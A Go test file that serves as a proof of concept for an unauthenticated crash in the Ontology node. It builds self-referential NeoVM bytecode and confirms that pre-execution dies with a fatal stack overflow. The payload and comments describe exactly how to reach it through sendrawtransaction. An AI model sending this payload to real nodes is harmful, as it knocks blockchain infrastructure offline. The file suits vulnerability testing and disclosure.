package test

import (
	"bytes"
	"fmt"
	"math"
	"os"
	"os/exec"
	"testing"

	"github.com/ontio/ontology/core/types"
	"github.com/ontio/ontology/smartcontract"
	neovmsvc "github.com/ontio/ontology/smartcontract/service/neovm"
	"github.com/ontio/ontology/vm/neovm"
)

// exploitInvokeCode is the full InvokeCode payload an unauthenticated attacker
// puts in a raw transaction. It builds the malicious native-invoke argument
// A = [false, A] and calls the native bridge:
//
//	PUSH1 NEWARRAY DUP DUP APPEND     -> args = [false, A]  (self-ref at index 1)
//	PUSHBYTES <method>                -> method  (popped 3rd, must be <=1024)
//	PUSHBYTES20 <20 zero bytes>       -> address (popped 2nd, must parse)
//	PUSH0                             -> version (popped 1st)
//	SYSCALL "Ontology.Native.Invoke"  -> NativeInvoke pops the above, then calls
//	                                     args.BuildParamToNative(sink) -> overflow
func exploitInvokeCode() []byte {
	var s []byte
	// args = [false, self]
	s = append(s, byte(neovm.PUSH1), byte(neovm.NEWARRAY), byte(neovm.DUP), byte(neovm.DUP), byte(neovm.APPEND))
	// method bytes (any non-empty, <= METHOD_LENGTH_LIMIT)
	method := []byte("transfer")
	s = append(s, byte(len(method)))
	s = append(s, method...)
	// contract address: exactly 20 bytes so AddressParseFromBytes succeeds
	addr := make([]byte, 20)
	s = append(s, byte(20))
	s = append(s, addr...)
	// version int
	s = append(s, byte(neovm.PUSH0))
	// SYSCALL "Ontology.Native.Invoke" (len 22 < 0xFD -> single-byte varint prefix)
	name := []byte(neovmsvc.NATIVE_INVOKE_NAME)
	s = append(s, byte(neovm.SYSCALL), byte(len(name)))
	s = append(s, name...)
	return s
}

// PROOF (reachability, the real pre-exec entrypoint): building the engine EXACTLY
// as core/store/ledgerstore.PreExecuteContractWithParam does for an InvokeNeo tx
// -- full gas table, PreExec=true, node-granted near-MaxUint64 gas -- and invoking
// it on the attacker's InvokeCode dies with an unrecoverable stack overflow. This
// is the same call sendrawtransaction(..., preExec=1) reaches with NO auth, NO
// signature check, and NO attacker-supplied gas/funds.
//
// The crash is a runtime throw that kills the process, so it runs in a re-exec'd
// child; the parent asserts on the child's output.
func TestFreshProof_PreExecPathStackOverflow(t *testing.T) {
	if os.Getenv("FRESHPROOF_PREEXEC_CHILD") == "1" {
		runPreExecCrashChild()
		return
	}

	cmd := exec.Command(os.Args[0], "-test.run=TestFreshProof_PreExecPathStackOverflow", "-test.v")
	cmd.Env = append(os.Environ(), "FRESHPROOF_PREEXEC_CHILD=1")
	out, _ := cmd.CombinedOutput()
	t.Logf("=== child (real pre-exec path) output (truncated) ===\n%s", headBytes(out, 2200))

	if bytes.Contains(out, []byte("RECOVERED=")) {
		t.Fatal("recover() caught it -> would NOT be a fatal node kill")
	}
	if bytes.Contains(out, []byte("NO_CRASH_returned_normally")) {
		t.Fatal("engine.Invoke() returned normally -> no crash")
	}
	if bytes.Contains(out, []byte("ENGINE_ERR=")) {
		t.Fatal("engine construction failed -> test setup wrong, not a real crash")
	}
	if !bytes.Contains(out, []byte("fatal error: stack overflow")) {
		t.Fatal("expected `fatal error: stack overflow` from the pre-exec path, not found")
	}
	t.Log("CONFIRMED: SmartContract.NewExecuteEngine(exploit, InvokeNeo).Invoke() -> fatal error: stack overflow")
	t.Log("This is the exact call PreExecuteContractWithParam runs for sendrawtransaction(preExec=1).")
}

func runPreExecCrashChild() {
	// If this were an ordinary panic, recover() would print RECOVERED and exit 0.
	// A runtime stack-overflow throw bypasses recover entirely: the process dies.
	defer func() {
		if r := recover(); r != nil {
			fmt.Fprintf(os.Stderr, "RECOVERED=%v\n", r)
			os.Exit(0)
		}
	}()

	code := exploitInvokeCode()
	fmt.Fprintf(os.Stderr, "child_invokecode_len=%d\n", len(code))

	// Mirror LedgerStoreImp.PreExecuteContractWithParam exactly.
	gasTable := make(map[string]uint64)
	neovmsvc.GAS_TABLE.Range(func(k, value interface{}) bool {
		gasTable[k.(string)] = value.(uint64)
		return true
	})
	config := &smartcontract.Config{
		Time:   10,
		Height: 100000000,
		Tx:     &types.Transaction{},
	}
	sc := smartcontract.SmartContract{
		Config:   config,
		GasTable: gasTable,
		Gas:      math.MaxUint64 - 100000, // node grants near-max gas during pre-exec
		CacheDB:  nil,
		PreExec:  true,
	}
	engine, err := sc.NewExecuteEngine(code, types.InvokeNeo)
	if err != nil {
		fmt.Fprintf(os.Stderr, "ENGINE_ERR=%v\n", err)
		os.Exit(0)
	}
	fmt.Fprintln(os.Stderr, "child_calling_engine.Invoke")
	_, _ = engine.Invoke() // <- fatal error: stack overflow (NativeInvoke -> BuildParamToNative)
	fmt.Fprintln(os.Stderr, "NO_CRASH_returned_normally")
	os.Exit(0)
}

func headBytes(b []byte, n int) []byte {
	if len(b) <= n {
		return b
	}
	return b[:n]
}
